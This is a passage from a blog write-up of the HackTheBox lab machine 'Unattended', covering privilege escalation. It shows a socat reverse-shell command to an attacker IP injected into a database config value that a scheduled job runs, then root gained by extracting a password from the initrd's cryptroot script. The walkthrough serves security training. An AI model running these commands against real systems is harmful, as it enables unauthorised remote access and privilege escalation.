tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
</code></pre><ul><li>Let&rsquo;s check <code>mysql</code>, since there is nothing else to check</li></ul><pre tabindex=0><code>www-data@unattended:/$ mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 33
Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| neddy              |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]&gt; use neddy;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [neddy]&gt; show tables;
+-----------------+
| Tables_in_neddy |
+-----------------+
| config          |
| customers       |
| employees       |
| filepath        |
| idname          |
| offices         |
| orderdetails    |
| orders          |
| payments        |
| productlines    |
| products        |
+-----------------+
11 rows in set (0.00 sec)

MariaDB [neddy]&gt; 
</code></pre><ul><li>Let&rsquo;s check <code>config</code> table</li></ul><pre tabindex=0><code>MariaDB [neddy]&gt; select * from config;
+-----+-------------------------+--------------------------------------------------------------------------+
| id  | option_name             | option_value                                                             |
+-----+-------------------------+--------------------------------------------------------------------------+
|  54 | offline                 | 0                                                                        |
|  55 | offline_message         | Site offline, please come back later                                     |
|  56 | display_offline_message | 0                                                                        |
|  57 | offline_image           |                                                                          |
|  58 | sitename                | NestedFlanders                                                           |
|  59 | editor                  | tinymce                                                                  |
|  60 | captcha                 | 0                                                                        |
|  61 | list_limit              | 20                                                                       |
|  62 | access                  | 1                                                                        |
|  63 | debug                   | 0                                                                        |
|  64 | debug_lang              | 0                                                                        |
|  65 | dbtype                  | mysqli                                                                   |
|  66 | host                    | localhost                                                                |
|  67 | live_site               |                                                                          |
|  68 | gzip                    | 0                                                                        |
|  69 | error_reporting         | default                                                                  |
|  70 | ftp_host                | 127.0.0.1                                                                |
|  71 | ftp_port                | 21                                                                       |
|  72 | ftp_user                | flanders                                                                 |
|  73 | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |
|  74 | ftp_root                | /                                                                        |
|  75 | ftp_enable              | 1                                                                        |
|  76 | offset                  | UTC                                                                      |
|  77 | mailonline              | 1                                                                        |
|  78 | mailer                  | mail                                                                     |
|  79 | mailfrom                | nested@nestedflanders.htb                                                |
|  80 | fromname                | Neddy                                                                    |
|  81 | sendmail                | /usr/sbin/sendmail                                                       |
|  82 | smtpauth                | 0                                                                        |
|  83 | smtpuser                |                                                                          |
|  84 | smtppass                |                                                                          |
|  85 | smtppass                |                                                                          |
|  86 | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |
|  87 | smtphost                | localhost                                                                |
|  88 | smtpsecure              | none                                                                     |
|  89 | smtpport                | 25                                                                       |
|  90 | caching                 | 0                                                                        |
|  91 | cache_handler           | file                                                                     |
|  92 | cachetime               | 15                                                                       |
|  93 | MetaDesc                |                                                                          |
|  94 | MetaKeys                |                                                                          |
|  95 | MetaTitle               | 1                                                                        |
|  96 | MetaAuthor              | 1                                                                        |
|  97 | MetaVersion             | 0                                                                        |
|  98 | robots                  |                                                                          |
|  99 | sef                     | 1                                                                        |
| 100 | sef_rewrite             | 0                                                                        |
| 101 | sef_suffix              | 0                                                                        |
| 102 | unicodeslugs            | 0                                                                        |
| 103 | feed_limit              | 10                                                                       |
| 104 | lifetime                | 1                                                                        |
| 105 | session_handler         | file                                                                     |
+-----+-------------------------+--------------------------------------------------------------------------+
</code></pre><ul><li>We can insert and update entires in <code>neddy</code> database</li></ul><pre tabindex=0><code>MariaDB [neddy]&gt; SHOW GRANTS;
+-----------------------------------------------------------------------------------------------------------------------+
| Grants for nestedflanders@localhost                                                                                   |
+-----------------------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO &#39;nestedflanders&#39;@&#39;localhost&#39; IDENTIFIED BY PASSWORD &#39;*9E1AD37C883F20EE8B5FB34B4B150262F9671A58&#39; |
| GRANT SELECT, INSERT, UPDATE ON `neddy`.* TO &#39;nestedflanders&#39;@&#39;localhost&#39;                                             |
+-----------------------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
</code></pre><ul><li>The interesting entry is <code>checkrelease</code> which has a value of <code>/home/guly/checkbase.pl;/home/guly/checkplugins.pl;</code><ul><li>Maybe there is an execution happening, but since we can&rsquo;t run <code>pspy</code> due to <code>hidepid</code>, we can only test it by changing</li><li>The box has no <code>nc</code>, but has <code>socat</code> installed</li><li>update config set option_value = &ldquo;socat TCP:10.10.16.4:6666 EXEC:&lsquo;bash -li&rsquo;,pty,stderr,setsid,sigint,sane&rdquo; where id = 86;</li></ul></li></ul><pre tabindex=0><code>MariaDB [neddy]&gt; update config set option_value = &#34;socat TCP:10.10.16.4:80 EXEC:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane&#34; where id = 86;
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [neddy]&gt; select * from config where id = 86;
+----+--------------+-------------------------------------------------------------------------+
| id | option_name  | option_value                                                            |
+----+--------------+-------------------------------------------------------------------------+
| 86 | checkrelease | socat TCP:10.10.16.4:80 EXEC:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane |
+----+--------------+-------------------------------------------------------------------------+
1 row in set (0.00 sec)
</code></pre><ul><li>After few seconds we receive a connection</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/unattended/images/9.png></p><h2 id=root>Root</h2><ul><li>User groups show us unusual group <code>grub</code>, which is not listed in <a href=https://wiki.debian.org/SystemGroups target=_blank rel=noopener>https://wiki.debian.org/SystemGroups</a></li></ul><pre tabindex=0><code>guly@unattended:~$ id
uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)
</code></pre><ul><li>Let&rsquo;s check the files/directories owned by that group</li></ul><pre tabindex=0><code>guly@unattended:~$ find / -group grub 2&gt;/dev/null
/boot/initrd.img-4.9.0-8-amd64
guly@unattended:~$ file /boot/initrd.img-4.9.0-8-amd64
/boot/initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Wed Sep 28 10:31:45 2022, from Unix
</code></pre><ul><li>It&rsquo;s a <a href=https://docs.kernel.org/admin-guide/initrd.html target=_blank rel=noopener>initrd</a><ul><li><code>initrd provides the capability to load a RAM disk by the boot loader. This RAM disk can then be mounted as the root file system and programs can be run from it.</code></li><li>Since it contains initial settings and executables, let&rsquo;s check if there is something interesting<ul><li>Lets uncompress it via <code>zcat /boot/initrd.img | cpio -idmv</code></li><li><a href=https://access.redhat.com/solutions/24029 target=_blank rel=noopener>https://access.redhat.com/solutions/24029</a></li></ul></li></ul></li></ul><pre tabindex=0><code>guly@unattended:/dev/shm/archive$ zcat /boot/initrd.img-4.9.0-8-amd64 | cpio -idmv
.
boot
boot/guid
&lt;SNIP&gt;
</code></pre><pre tabindex=0><code>guly@unattended:/dev/shm/archive$ ls
bin  boot  conf  etc  init  lib  lib64  run  sbin  scripts
</code></pre><ul><li>Started with looking at the scripts folder<ul><li>Noticed <code>cryptroot</code> script</li><li>While scrolling through, we see an interesting comment by <code>guly</code></li></ul></li></ul><pre tabindex=0><code>guly@unattended:/dev/shm/archive/scripts$ ls -lha  local-top/
total 20K
drwxr-xr-x 2 guly guly  100 Oct 29 10:02 .
drwxr-xr-x 8 guly guly  220 Oct 29 10:02 ..
-rwxr-xr-x 1 guly guly  721 May  9  2017 cryptopensc
-rwxr-xr-x 1 guly guly 9.3K Dec 20  2018 cryptroot
-rw-r--r-- 1 guly guly  162 Sep 28  2022 ORDER
</code></pre><pre tabindex=0><code>&lt;SNIP&gt;
# guly: we have to deal with lukfs password sync when root changes her one
if ! crypttarget=&#34;$crypttarget&#34; cryptsource=&#34;$cryptsource&#34; \
/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
                message &#34;cryptsetup: cryptsetup failed, bad password or options?&#34;
                sleep 3
                continue
        fi
fi

&lt;SNIP&gt;
</code></pre><ul><li>We have <code>if</code> block with <code>crypttarget="$crypttarget" cryptsource="$cryptsource" /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen</code><ul><li>We see an execution <code>uinitrd c0m3s3f0ss34nt4n1</code> passed to <code>$cryptopen</code>, which is a <code>cryptsetup</code><ul><li><code>Cryptsetup provides an interface for configuring encryption on block devices (such as /home or swap partitions), using the Linux kernel device mapper target dm-crypt. It features integrated Linux Unified Key Setup (LUKS) support.</code></li><li><a href=https://man7.org/linux/man-pages/man8/cryptsetup.8.html target=_blank rel=noopener>https://man7.org/linux/man-pages/man8/cryptsetup.8.html</a></li></ul></li><li>So <code>uinitrd</code> probably passes a password to <code>cryptsetup</code><ul><li><a href=https://superuser.com/questions/1179046/passing-luks-passphrase-to-unlock-encrypted-rootfs-with-script-instead-of-passin target=_blank rel=noopener>https://superuser.com/questions/1179046/passing-luks-passphrase-to-unlock-encrypted-rootfs-with-script-instead-of-passin</a></li></ul></li></ul></li></ul><pre tabindex=0><code>&lt;SNIP&gt;
# Prepare commands
cryptopen=&#34;/sbin/cryptsetup -T 1&#34;
if [ &#34;$cryptdiscard&#34; = &#34;yes&#34; ]; then
        cryptopen=&#34;$cryptopen --allow-discards&#34;
fi
&lt;SNIP&gt;
</code></pre><ul><li>Let&rsquo;s try running it<ul><li>I forgot we had <code>noexec</code> set, so I had to move the binary <code>guly</code> home directory</li></ul></li></ul><pre tabindex=0><code>guly@unattended:/dev/shm/archive$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
bash: ./sbin/uinitrd: Permission denied
guly@unattended:/dev/shm/archive$ chmod +x ./sbin/uinitrd
guly@unattended:/dev/shm/archive$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
bash: ./sbin/uinitrd: Permission denied
</code></pre><pre tabindex=0><code>uly@unattended:/dev/shm/archive$ cp ./sbin/uinitrd ~/
guly@unattended:/dev/shm/archive$ chmod +x ~/uinitrd 
guly@unattended:/dev/shm/archive$ ~/uinitrd c0m3s3f0ss34nt4n1
132f93ab100671dcb263acaf5dc95d8260e8b7c6
</code></pre><ul><li>We can <code>su</code> as <code>root</code></li></ul><pre tabindex=0><code>/dev/shm/archive$ su -
Password: 
root@unattended:~#
</code></pre></div><div class="row ps-3 pe-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
<a class="btn icon-button bg-facebook" href="https://www.facebook.com/sharer.php?u=https%3a%2f%2f0x13hrafnulf.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2funattended%2f" target=_blank><i class="fab fa-facebook"></i>
</a><a class="btn icon-button bg-twitter" href="https://twitter.com/share?url=https%3a%2f%2f0x13hrafnulf.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2funattended%2f&text=%5bHTB%5d%20Machine%3a%20Unattended&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
</a><a class="btn icon-button bg-reddit" href="https://reddit.com/submit?url=https%3a%2f%2f0x13hrafnulf.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2funattended%2f&title=%5bHTB%5d%20Machine%3a%20Unattended" target=_blank><i class="fab fa-reddit"></i>
</a><a class="btn icon-button bg-linkedin" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2f0x13hrafnulf.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2funattended%2f&title=%5bHTB%5d%20Machine%3a%20Unattended" target=_blank><i class="fab fa-linkedin"></i>
</a><a class="btn icon-button bg-whatsapp" href="https://api.whatsapp.com/send?text=%5bHTB%5d%20Machine%3a%20Unattended https%3a%2f%2f0x13hrafnulf.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2funattended%2f" target=_blank><i class="fab fa-whatsapp"></i>
</a><a class="btn icon-button" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Unattended&body=https%3a%2f%2f0x13hrafnulf.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2funattended%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/0x13hrafnulf/0x13hrafnulf.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/linux/unattended/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion" class="btn filled-button"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: TwoMillion</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/union/ title="[HTB] Machine: Union" class="btn filled-button"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Union</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn type=button data-bs-toggle=tooltip data-bs-placement=left title="Scroll to top"><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center ps-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#user>User</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-start"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://0x13hrafnulf.github.io/#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://0x13hrafnulf.github.io/#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://0x13hrafnulf.github.io/#projects>Projects</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-start"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu16779671404603505019.png alt="Toha Theme Logo">
Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-end"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.92e73658cc99b2c4edbf2137f68858267bd9465844390da549f3bb0514b4434d.js integrity="sha256-kuc2WMyZssTtvyE39ohYJnvZRlhEOQ2lSfO7BRS0Q00=" defer></script></body></html>